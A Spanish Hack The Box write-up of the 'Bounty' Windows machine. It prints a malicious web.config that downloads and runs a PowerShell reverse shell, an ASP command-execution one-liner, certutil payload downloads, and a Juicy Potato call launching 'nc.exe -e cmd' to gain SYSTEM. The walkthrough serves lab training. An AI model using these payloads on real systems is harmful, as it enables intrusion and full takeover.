---
title: "Bounty - Hack The Box"
date: 2023-04-24
draft: false
slug: "htb-writeup-bounty"
excerpt: "Esta es una máquina algo sencilla, vamos a usar Fuzzing a la página web que está activa en el puerto HTTP, como no descubrimos nada, buscaremos por archivos ASP, pues usa el servicio IIS y encontraremos una página para subir archivos. Utilizaremos BurpSuite para descubrir que archivos acepta, que en este caso serán los .config, usaremos un archivo web.config para cargar un Payload de Nishang .ps1, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos Juicy Potato, pues tiene los privilegios necesarios para utilizarlo."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Windows", "Microsoft IIS", "Fuzzing", "BurpSuite", "Sniper Attack", "Malicious web.config File", "ASP/ASPX Payload", "Privesc - Juicy Potato", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "burpsuite"
  - "python"
  - "nc"
  - "grep"
  - "wget"
  - "dir"
  - "whoami"
  - "systeminfo"
  - "locate"
  - "certutil.exe"
  - "juicy potato"
links:
  - "https://noticiasseguridad.com/importantes/como-hacer-pruebas-de-penetracion-de-con-wfuzz/"
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services"
  - "https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/"
  - "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1"
  - "https://github.com/ohpe/juicy-potato/releases/tag/v0.1"
  - "https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato"
  - "https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-bounty/bounty_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.10.93
PING 10.10.10.93 (10.10.10.93) 56(84) bytes of data.
64 bytes from 10.10.10.93: icmp_seq=1 ttl=127 time=131 ms
64 bytes from 10.10.10.93: icmp_seq=2 ttl=127 time=131 ms
64 bytes from 10.10.10.93: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.93: icmp_seq=4 ttl=127 time=132 ms

--- 10.10.10.93 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 130.590/131.044/131.829/0.481 ms
```
Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:51 CST
Initiating SYN Stealth Scan at 14:51
Scanning 10.10.10.93 [65535 ports]
Discovered open port 80/tcp on 10.10.10.93
Increasing send delay for 10.10.10.93 from 0 to 5 due to 11 out of 18 dropped probes since last increase.
Completed SYN Stealth Scan at 14:52, 29.73s elapsed (65535 total ports)
Nmap scan report for 10.10.10.93
Host is up, received user-set (0.76s latency).
Scanned at 2023-04-24 14:51:40 CST for 30s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 29.81 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 22 (956B)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solo veo un puerto abierto, hagamos el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p80 10.10.10.93 -oN targeted                            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 14:53 CST
Nmap scan report for 10.10.10.93
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5

| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.03 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Veo el servicio **IIS** operando en el puerto HTTP que ya hemos hackeado en otras máquinas. Revisemos ese puerto.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Bien, entremos.

![](/assets/images/htb-writeup-bounty/Captura1.png)

Solamente hay una imagen, veamos que nos dice **Wappalizer**.

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura2.png">
</p>

Ok, ya sabemos que nos enfrentamos al servicio **IIS**, veamos si **whatweb** nos muestra algo distinto:
```bash
whatweb http://10.10.10.93
http://10.10.10.93 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.93], Microsoft-IIS[7.5], Title[Bounty], X-Powered-By[ASP.NET]
```

Nada nuevo, cuando nos enfrentamos al **servicio IIS**, recordemos que utiliza **ASP.NET** lo cual indica que pueden existir archivos **ASP o ASPX** dentro de este servicio.

Vamos a aplicar **Fuzzing** enfocado a que busque estos archivos.

### Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.93/FUZZ.FUZ2Z
Total requests: 441092

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000007538:   200        21 L     58 W       941 Ch      "transfer - aspx"                                                                                                                                                         
000013980:   400        0 L      2 W        11 Ch       "*checkout* - aspx"                                                                                                                                                       
000032798:   400        0 L      2 W        11 Ch       "* - aspx"                                                                                                                                                                
000045914:   400        0 L      2 W        11 Ch       "http%3A%2F%2Fwww - aspx"                                                                                                                                                 
000063706:   400        0 L      2 W        11 Ch       "http%3A - aspx"                                                                                                                                                          
000070528:   400        0 L      2 W        11 Ch       "q%26a - aspx"                                                                                                                                                            
000071290:   400        0 L      2 W        11 Ch       "**http%3a - aspx"                                                                                                                                                        
000030898:   400        0 L      2 W        11 Ch       "*docroot* - aspx"                                                                                                                                                        
000078386:   400        0 L      2 W        11 Ch       "*http%3A - aspx"
...
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-z*	     | Para indicar el uso de una lista de extensiones de archivos a buscar. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x asp,aspx
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.93/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx,asp
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/transfer.aspx        (Status: 200) [Size: 941]
/*checkout*.aspx      (Status: 400) [Size: 11]
/*docroot*.aspx       (Status: 400) [Size: 11]
/*.aspx               (Status: 400) [Size: 11]
/UploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/UploadedFiles/]
/*http%3A.aspx        (Status: 400) [Size: 11]
/uploadedFiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedFiles/]
/**http%3A.aspx       (Status: 400) [Size: 11]
/uploadedfiles        (Status: 301) [Size: 156] [--> http://10.10.10.93/uploadedfiles/]
/**http%3A%2F%2Fwww.aspx (Status: 400) [Size: 11]
...
Progress: 661576 / 661683 (99.98%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar las extensiones de archivos especificas a buscar. |

Encontramos solamente un archivo llamado **transfer.aspx**, vamos a ver de que se trata:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura3.png">
</p>

Al parecer podemos subir un archivo, el problema es que no sabemos qué tipo de archivo acepta, así que tenemos dos opciones:
* Probar con varios tipos para ver cuál acepta.
* Usar **BurpSuite**

Vamos a probar con **BurpSuite**.

### Realizando un Ataque Sniper con BurpSuite {#Attack}

Lo que haremos será capturar la subida de archivos del **aspx**.

Abre **BurpSuite** y ponlo en modo de captura, lo que haré será intentar subir una **Reverse Shell** de **PHP** que tenia a la mano para captura la petición.

-------------
**IMPORTANTE**

Este ataque es tardado, así que ten paciencia.

------------

Sigamos:

<p alignn="center">
<img src="/assets/images/htb-writeup-bounty/Captura4.png">
</p>

Y vemos lo que se capturó:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura5.png">
</p>

Mandamos nuestra captura al **Intruder**, puedes hacerlo rapido con **ctrl + i**. Ahora dirigete al **Intruder** y ya debería estar ahí:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura6.png">
</p>

Podemos escoger el tipo de ataque que queremos y ahí veremos el **ataque Sniper**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura7.png">
</p>

Bien, lo que debemos hacer es limpiar la captura para poder elegir donde vamos posicionar nuestro payload para el ataque, para eso solamente le damos click al botón **clear** que está del lado derecho y debería quedar así:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura8.png">
</p>

Del archivo que subimos, selecciona su extensión ya que es este el que vamos a usar para cargar nuestro payload, es decir, usaremos este archivo para que **BurpSuite** utilice un payload que escojamos e introduzca distintas extensiones para probar cual es la extensión que acepta la página:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura9.png">
</p>

Y le damos click en el botón **Add** que está arriba de **clear**, nos debería quedar así:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura10.png">
</p>

Ahora vamos a cargar el Payload con las extensiones, para hacerlo, vamos a la sección **Payloads** y le daremos click a **Load** de la sección **Payload settings**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura11.png">
</p>

De ahí, nos iremos al directorio **Seclists** que está en el directorio **/usr/share**.

**NOTA**: El directorio **Seclists** lo tienes que instalar en tu máquina, ya que de momento, no viene preinstalado en Kali.

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura12.png">
</p>

Entramos en el directorio **Discovery** y luego en **Web-Content**, el archivo que buscamos es el llamado **raft-medium-extensions-lowercase.txt**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura13.png">
</p>

Lo seleccionas, lo abres y ya estarán cargadas las extensiones:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura14.png">
</p>

**OJO**, debemos quitar la opción **Payload encoding** porque como estamos usando extensiones, si no la quitamos, nos va a url encodear los puntos de cada extensión y no servirá el ataque:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura17.png">
</p>

Vamos bien, ahora ve a la sección **Settings** y vamos a la sección **Grep - Extract** para añadir una expresión regular que nos va a mostrar lo que queremos ver, en este caso, que extensión acepta la página:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura15.png">
</p>

Sigue las indicaciones, dale a **Fecth Response** y selecciona el error **Invalid File. Please try again**, esto para que nos reporte resultados que no tengan esta clase de expresión:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura16.png">
</p>

Y ya está listo el ataque, si nos vamos hasta arriba de **BurpSuite** podemos lanzar el ataque con la opción **Start Attack**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura18.png">
</p>

Durante el ataque, veremos el siguiente archivo, este nos puede servir para buscar un Exploit:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura19.png">
</p>

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando un Exploit para Servicio IIS {#Exploit}

Buscando por internet, encontre este blog que explica una vulnerabilidad en el **servicio IIS v7 (y superiores)** con el **archivo web.config**:
* <a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/iis/web-config/" target="_blank">IIS - Web.config File Exploit</a>

Este **archivo web.config** es similar a subir un **archivo .htacces** a un **servidor web Apache** que es de su configuración, existen tecnicas para subir **archivos .htaccess** maliciosos y poder realizar acciones como un Bypass a las protecciones que tenga el servidor, esto (menciona el blog) también lo podemos aplicar para el **servicio IIS v7 y superiores**, vamos a comprobarlo.

Vamos a utilizar el primer ejemplo que viene en el blog, pues lo que hace este archivo es una simple operación matemática de 2+1, el resultado debería mostrarse cuando se cargue este archivo en la página web.

#### Probando Archivo web.config Modificado {#Exploit2}

Copia ese ejemplo y lo llamaremos igual **web.config**, lo vamos a cargar a la página web para poder verla en alguno de los directorios **uploadFiles** que nos mostro **gobuster**:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura20.png">
</p> 

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura21.png">
</p>

Sabemos que ya se guardo con exito, antes de probar cualquier de los 3 directorios que encontro **gobuster**, vamos a comprobar si existen más directorios tipo **upload** con **wfuzz**.

Vamos a hacer un **Fuzzing**, pero usando un diccionario qué este enfocado a directorios que sean para cargar archivos, es decir, los tipo **upload**. Para esto, vamos a hacer un **grep** al **wordlist** de **Dirbuster**, que siempre he usado, que sería el **dirbuster/directory-list-2.3-medium.txt**:
```bash
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload
uploads
upload
WPupload
uploaded_images
uploaded
...
```

Bien, salen bastantes resultados. Vamos a guardarlos en un archivo **.txt** para usarlo como diccionario:
```bash
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | grep -i upload > diccionario.txt
```

Ahora vamos a usar **wfuzz** y usaremos el diccionario que creamos para que solamente busque los directorios tipo **upload**:
```bash
wfuzz -c --hc=404 -t 200 -w $(pwd)/diccionario.txt http://10.10.10.93/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.93/FUZZ/
Total requests: 46

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000014:   403        29 L     92 W       1233 Ch     "uploadedFiles"                                                       
000000024:   403        29 L     92 W       1233 Ch     "uploadedfiles"                                                       
000000011:   403        29 L     92 W       1233 Ch     "UploadedFiles"                                                       

Total time: 0.600349
Processed Requests: 46
Filtered Requests: 43
Requests/sec.: 76.62198
```
Muy bien, ya comprobamos que no encontro más directorios de este tipo aunque me reporta un código de estado distinto a **gobuster**, siendo el código de estado de 403, ósea que existen estos directorios, pero no tenemos acceso a ellos. 

Nosotros ya sabemos que se guardó nuestro archivo **web.config**, aunque no tengamos permiso para ver/entrar estos directorios, si conocemos el nombre del archivo que buscamos, podremos verlo sin ningún problema.

Ve al directorio **uploadFiles**, pon el nombre **web.config** y deberíamos ver un 3, si no se ve, vuelve a subir el archivo y carga la página otra vez:

<p align="center">
<img src="/assets/images/htb-writeup-bounty/Captura22.png">
</p>

Excelente, entonces podemos aprovecharnos de esto para poder ganar acceso a la máquina. 

### Probando Archivo web.config Malicioso y Ganando Acceso a la Máquina {#Exploit3}

Para realizar esto, vamos a cambiar el script del **web.config** para que pueda cargar un **Payload** de una **Reverse Shell** y nos pueda conectar a la máquina. El **Payload** que vamos a ocupar será de **Nishang**, usaremos el **Invoke-PowerShellTcp.ps1**.

Vamos por pasos:

* Copiamos el archivo en nuestra máquina:
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
--2023-04-24 21:13:28--  https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.108.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 4339 (4.2K) [text/plain]
Grabando a: «Invoke-PowerShellTcp.ps1»
-
Invoke-PowerShellTcp.ps1          100%[============================================================>]   4.24K  --.-KB/s    en 0s      
-
2023-04-24 21:13:28 (83.7 MB/s) - «Invoke-PowerShellTcp.ps1» guardado [4339/4339]
```

* Dentro del **.ps1**, vamos a agregar una línea que nos recomienda el mismo Payload al final:
```powershell
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress Tu_IP -Port 443
```

* Ahora vamos a cambiar el **web.config**. El siguiente oneliner de **ASP** nos ayudara, ya que ese indica el archivo:
```powershell
<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
```

* Lo copiamos y sustituimos la operación que se hizo en el **web.config**. Así debería quedar:
```powershell
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set co = CreateObject("WScript.Shell")
Set cte = co.Exec("cmd /c powershell IEX(New-Object Net.WebClient).downloadString('http://Tu_IP:80/Reverse_Shell.ps1')")
output = cte.StdOut.Readall()
Response.write(output)
%>
-->
```

Adentro de la función **co.Exec** pondremos el oneliner para cargar el Payload **.ps1**.

Ya tenemos todo listo, lo que sigue es cargar el **web.config** y abriremos un servidor en **Python** para cargar el Payload.

Vamos igual por pasos:

* Abre un servidor en **Python** en donde tengas el **.ps1**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* Abre una **netcat**:
```bash
nc -nvlp 443   
listening on [any] 443 ...
```

* Carga el **web.config** y recarga la página web.

* Y ya deberíamos estar conectados:
```bash
nc -nvlp 443   
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\windows\system32\inetsrv>whoami
bounty\merlin
```

Ahora, buscamos la flag del usuario:
```batch
PS C:\windows\system32\inetsrv> cd C:\
PS C:\> dir
    Directory: C:\

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         5/30/2018   4:14 AM            inetpub                           
d----         7/14/2009   6:20 AM            PerfLogs                          
d-r--         6/10/2018   3:43 PM            Program Files                     
d-r--         7/14/2009   8:06 AM            Program Files (x86)               
d-r--         5/31/2018  12:18 AM            Users                             
d----         5/31/2018  11:37 AM            Windows                           
PS C:\> cd Users
PS C:\Users> dir
    Directory: C:\Users
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         5/31/2018  12:18 AM            Administrator                     
d----         5/30/2018   4:44 AM            Classic .NET AppPool              
d----         5/30/2018  12:22 AM            merlin                            
d-r--         5/30/2018   5:44 AM            Public                            
PS C:\Users> cd merlin/Desktop
PS C:\Users\merlin\Desktop> dir
```
No hay nada, que raro. 

Lo que pasa, es que se les ocurrió ocultar la flag, entonces vamos a ver los archivos ocultos:
```batch
PS C:\Users\merlin\Desktop> dir -Force
    Directory: C:\Users\merlin\Desktop

Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-arh-         4/25/2023  10:17 PM         34 user.txt                          
PS C:\Users\merlin\Desktop> type user.txt
```
Excelente, es tiempo de escalar privilegios.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima {#Enum}

Veamos qué privilegios tenemos:
```batch
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Con el privilegio **SeImpersonatePrivilege** ya sabemos que podemos usar el **Juicy Potato**. 

Veamos que SO tiene la máquina:
```batch
PS C:\> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
...
```

Está usando **Microsoft Windows Server 2008 R2 Datacenter**. Ahora, busquemos el **Juicy Potato**.
* <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank">Repositorio de ohpe: Juicy Potato - Releases</a>

Descarga él **.exe**, busca una **nc.exe** y cópiala en la misma carpeta que en donde esté el **Juicy Potato**:
```bash
locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
cp /usr/share/windows-resources/binaries/nc.exe .
```

Para cargar el **Juicy Potato** y la **nc.exe**, vamos a utilizar la herramienta **certutil.exe** de la máquina víctima y abriendo un servidor de **Python**. 

Hagámoslo por pasos:
* Abre el servidor de **Python**:
```bash
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

* En la máquina víctima, crea un directorio en el directorio **/Temp**:
```batch
PS C:\> cd Windows/Temp
PS C:\Windows\Temp> mkdir Privesc
    Directory: C:\Windows\Temp
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         4/25/2023  10:46 PM            Privesc                           
PS C:\Windows\Temp> cd Privesc
PS C:\Windows\Temp\Privesc>
```

* Usa **certutil.exe** para descargar ambos archivos:
```batch
PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://Tu_IP:8000/JuicyPotato.exe JuicyPotato.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\Privesc> dir
    Directory: C:\Windows\Temp\Privesc
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         4/25/2023  10:48 PM     347648 JuicyPotato.exe                   
PS C:\Windows\Temp\Privesc> certutil.exe -urlcache -split -f http://Tu_IP:8000/nc.exe nc.exe
****  Online  ****
  0000  ...
  e800
CertUtil: -URLCache command completed successfully.
PS C:\Windows\Temp\Privesc> dir
    Directory: C:\Windows\Temp\Privesc
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         4/25/2023  10:48 PM     347648 JuicyPotato.exe                   
-a---         4/25/2023  10:48 PM      59392 nc.exe
```
Listo, ahora usemos el **Juicy Potato**.

### Usando el Juicy Potato {#Juicy}

Para ver la forma de usarlo, usemos el parámetro **-h**:
```batch
PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -h
JuicyPotato v0.1 
Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port
Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

Bien, ahora vamos a mandar una **cmd** como **NT Authority System** a nuestra máquina. Para esto, hagamos lo siguiente:

* Abre una **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
```

* Usa el siguiente oneliner usando **JuicyPotato.exe** y la **nc.exe**:
```batch
PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd Tu_IP 1337"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

* Veamos la **netcat** y ya estaremos conectados:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.93] 49167
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\Windows\system32>whoami
whoami
nt authority\system
```
Afortunadamente no nos pidio un **CLSID**, por lo que fue más sencillo utilizar el **Juicy Potato**.

* Ya solo busca la flag que te falta:
```batch
C:\Windows\system32>cd ../../Users
cd ../../Users
C:\Users>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0
 Directory of C:\Users
05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
05/31/2018  12:18 AM    <DIR>          Administrator
05/30/2018  04:44 AM    <DIR>          Classic .NET AppPool
05/30/2018  12:22 AM    <DIR>          merlin
05/30/2018  05:44 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  11,884,220,416 bytes free
C:\Users>cd Administrator/Desktop
cd Administrator/Desktop
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5084-30B0
 Directory of C:\Users\Administrator\Desktop
05/31/2018  12:18 AM    <DIR>          .
05/31/2018  12:18 AM    <DIR>          ..
04/25/2023  10:17 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  11,884,220,416 bytes free
C:\Users\Administrator\Desktop>type root.txt
```
Y con esto ya tendremos la máquina terminada.

Te comparto este link sobre cómo usar el **Juicy Potato**:
* <a href="https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/" target="_blank">Windows Privilege Escalation: Abusing SeImpersonatePrivilege with Juicy Potato</a>
